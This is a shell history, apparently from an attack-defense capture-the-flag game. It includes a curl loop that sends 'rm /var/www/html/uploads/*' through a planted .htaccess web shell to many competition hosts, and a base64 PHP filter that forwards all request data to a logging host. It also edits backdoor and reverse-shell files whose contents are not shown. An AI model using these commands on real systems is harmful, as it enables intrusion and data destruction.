while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/uploads/*' --connect-timeout 1 --max-time 1 | head -n1&  done; sleep 0.1; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/uploads/*' --connect-timeout 1 --max-time 1 | head -n1&  done; sleep 0.2; done
cd service-dev/
ls
vi files/
cat docker-compose.yml 
ls
cd php
ls
cd ..
cat Dockerfile 
ls
cd php
ls -alh
vi .htaccess 
cd logs
ls
ls -alh
cd ..
vi .htaccess 
ls
cat .htaccess 
vi index.php 
cd
ls
vi ad
mkdir ad
cd ad
ls
echo 'PD9waHAgLy8gWW91ciBXQUYgZ29lcyBoZXJlCgokZD1bJ1MnPT4kX1NFUlZFUiwnUic9PiRfUkVRVUVTVCwidGVzdCI9PnRydWVdOwokbCA9IGpzb25fZW5jb2RlKCRkKTsKCiRoPWN1cmxfaW5pdCgnaHR0cDovLzEwLjE0LjE1LjExOTo4ODg3L2xvZ2dlci5waHAnKTsKY3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9QT1NULDEpOwpjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1RGSUVMRFMsJGwpOwovLyBjdXJsX3NldG9wdCgkaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMSk7Ci8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX1RJTUVPVVQsIDEpOwpAY3VybF9leGVjKCRoKTsKQGN1cmxfY2xvc2UoJGgpOwppZihpc3NldCgkX1BPU1RbJ3VybCddKSlkaWUoKTsKZm9yZWFjaCAoJF9SRVFVRVNUIGFzICRrID0+ICR2KSB7CiRfUkVRVUVTVFska109cHJlZ19yZXBsYWNlKCIva2lsbC8iLCcnLCR2KTsKfQpmdW5jdGlvbiBjKCRiKXsKICAgIGlmKHN0cmxlbigkYikgPT0gMClyZXR1cm4gJGI7CiAgICAkaD1jdXJsX2luaXQoJ2h0dHA6Ly8xMC4xNC4xNS4xMTk6ODg4Ny9sb2dnZXIucGhwJyk7CiAgICBjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1QsMSk7CiAgICBjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1RGSUVMRFMsanNvbl9lbmNvZGUoYXJyYXkoInJlc3AiPT4kYiwidGltZSI9PnRpbWUoKSkpKTsKICAgIC8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxKTsKICAgIC8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX1RJTUVPVVQsIDEpOwogICAgQGN1cmxfZXhlYygkaCk7CiAgICBAY3VybF9jbG9zZSgkaCk7CiAgICAkcCA9IGFycmF5KHN0cl9yb3QxMygnL1JCUycpLidcey57NX0vJyk7CiAgICAkciA9IGFycmF5KHN0cl9yb3QxMygiUkJTeyIpLnN1YnN0cihtZDUobWljcm90aW1lKCkpLHJhbmQoMCwyNiksNSkpOwogICAgcmV0dXJuIHByZWdfcmVwbGFjZSgkcCwgJHIsICRiKTsKfQoKb2Jfc3RhcnQoY2hyKDk5KSk7' | base64 > mywaf.php
echo 'PD9waHAgLy8gWW91ciBXQUYgZ29lcyBoZXJlCgokZD1bJ1MnPT4kX1NFUlZFUiwnUic9PiRfUkVRVUVTVCwidGVzdCI9PnRydWVdOwokbCA9IGpzb25fZW5jb2RlKCRkKTsKCiRoPWN1cmxfaW5pdCgnaHR0cDovLzEwLjE0LjE1LjExOTo4ODg3L2xvZ2dlci5waHAnKTsKY3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9QT1NULDEpOwpjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1RGSUVMRFMsJGwpOwovLyBjdXJsX3NldG9wdCgkaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMSk7Ci8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX1RJTUVPVVQsIDEpOwpAY3VybF9leGVjKCRoKTsKQGN1cmxfY2xvc2UoJGgpOwppZihpc3NldCgkX1BPU1RbJ3VybCddKSlkaWUoKTsKZm9yZWFjaCAoJF9SRVFVRVNUIGFzICRrID0+ICR2KSB7CiRfUkVRVUVTVFska109cHJlZ19yZXBsYWNlKCIva2lsbC8iLCcnLCR2KTsKfQpmdW5jdGlvbiBjKCRiKXsKICAgIGlmKHN0cmxlbigkYikgPT0gMClyZXR1cm4gJGI7CiAgICAkaD1jdXJsX2luaXQoJ2h0dHA6Ly8xMC4xNC4xNS4xMTk6ODg4Ny9sb2dnZXIucGhwJyk7CiAgICBjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1QsMSk7CiAgICBjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1BPU1RGSUVMRFMsanNvbl9lbmNvZGUoYXJyYXkoInJlc3AiPT4kYiwidGltZSI9PnRpbWUoKSkpKTsKICAgIC8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxKTsKICAgIC8vIGN1cmxfc2V0b3B0KCRoLCBDVVJMT1BUX1RJTUVPVVQsIDEpOwogICAgQGN1cmxfZXhlYygkaCk7CiAgICBAY3VybF9jbG9zZSgkaCk7CiAgICAkcCA9IGFycmF5KHN0cl9yb3QxMygnL1JCUycpLidcey57NX0vJyk7CiAgICAkciA9IGFycmF5KHN0cl9yb3QxMygiUkJTeyIpLnN1YnN0cihtZDUobWljcm90aW1lKCkpLHJhbmQoMCwyNiksNSkpOwogICAgcmV0dXJuIHByZWdfcmVwbGFjZSgkcCwgJHIsICRiKTsKfQoKb2Jfc3RhcnQoY2hyKDk5KSk7' | base64 -d > mywaf.php
ls
vi uploadwaf.py
rm uploadwaf.py 
vi deploy.py 
vi backdoor_htaccess 
ls
vi myprop.sh 
python3 deploy.py 
ls
python3 deploy.py 
ls
python3 deploy.py 
ls
cd ad
ls
vi myrev.sh
vi myprop.sh
vi backdoor_htaccess
base64 backdoor_htaccess 
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
i backdoor_htaccess
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'v
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'v
base64 backdoor_htaccess  | tr -d '\n'
vi backdoor_htaccess
base64 backdoor_htaccess  | tr -d '\n'
cp backdoor_htaccess attack_htaccess
vi attack_htaccess 
base64 backdoor_htaccess  | tr -d '\n'
ls
vi attack_revflag.sh
base64 attack_revflag.sh 
cat attack_revflag.sh 
cat attack_revflag.sh | tr -d '\n'
base64 attack_revflag.sh | tr -d '\n'
base64 backdoor_htaccess  | tr -d '\n'
ls
base64 attack_htaccess | tr -d '\n'
cat mywaf.php 
vi mywaf.php 
mv mywaf.php oldwaf.php
vi mywaf.php
vimdiff mywaf.php oldwaf.php 
cat oldwaf.php 
ls
mv uploadwaf.py deploy.py
python3 deploy.py 
ls
cat attack_revflag.sh 
ls
vi attack_revflag.sh 
mv attack_revflag.sh ~/exploit/
ls
python3 deploy.py 
:q
cat backdoor_htaccess 
ls
python3 deploy.py 
ls
vi mywaf.php 
ls
cd
cd exploit/
ls
cat attack_revflag.sh 
ls
cd ..
cd ad
ls
cat attack_htaccess 
base64 attack_htaccess  | 
base64 attack_htaccess  
base64 attack_htaccess  | tr -d '\n'
ls
vi backdoor_htaccess 
python3 deploy.py 
ls
vi myprop.sh 
s
vi mywaf.php 
python3 deploy.py 
ls
vi mywaf.php 
ls
vi myprop.sh 
vi mywaf.php 
vi myprop.sh 
htop
python -m http.server -p 8765
python3 -m http.server -p 8765
python3 -m http.server 8765
python3 -m http.server 8765 2&>flag.log
python3 -m http.server 8765 2>flag.log
python3 -m http.server 8765 
python3 -m http.server 8765 2>flag.log
cat score.sh 
apt install nginx
sudo apt install nginx
cd /etc/nginx/
ls
vi sites-enabled/
sudo vi sites-enabled/default 
service nginx reload
cd /var/log
cd nginx
ls
cat access.log 
vi sumbit.sh
sudo su
ls
cd exploit/
ls
cp meow.sh haha.sh
vi haha.sh 
./haha.sh 
vi haha.sh 
./haha.sh 
vi haha.sh 
./haha.sh 
vi haha.sh 
ll
ls
ll
vi meow.sh 
ls
vi meow.sh 
cd
cd ad
ls
vi attack_htaccess 
cd ..
ls
cd exploit/
ls
vi attack_revflag.sh 
vi /etc/nginx/sites-enabled/default 
